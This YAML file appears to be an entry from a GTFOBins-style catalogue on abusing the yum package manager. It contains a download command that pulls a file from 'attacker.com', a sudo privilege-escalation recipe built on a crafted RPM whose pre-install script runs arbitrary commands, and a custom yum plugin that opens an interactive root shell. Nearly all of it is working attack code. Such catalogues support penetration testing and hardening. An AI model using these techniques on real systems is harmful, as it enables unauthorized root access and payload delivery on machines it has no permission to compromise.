---
functions:
  file-download:
    - description: Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.
      code: |
        RHOST=attacker.com
        RFILE=file_to_get.rpm
        yum install http://$RHOST/$RFILE
  sudo:
    - description: |
        It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'id' > $TF/x.sh
        fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo yum localinstall -y x-1.0-1.noarch.rpm
    - description: |
        Spawn interactive root shell by loading a custom plugin.
      code: |
        TF=$(mktemp -d)
        cat >$TF/x<<EOF
        [main]
        plugins=1
        pluginpath=$TF
        pluginconfpath=$TF
        EOF

        cat >$TF/y.conf<<EOF
        [main]
        enabled=1
        EOF

        cat >$TF/y.py<<EOF
        import os
        import yum
        from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
        requires_api_version='2.1'
        def init_hook(conduit):
          os.execl('/bin/sh','/bin/sh')
        EOF

        sudo yum -c $TF/x --enableplugin=y
---
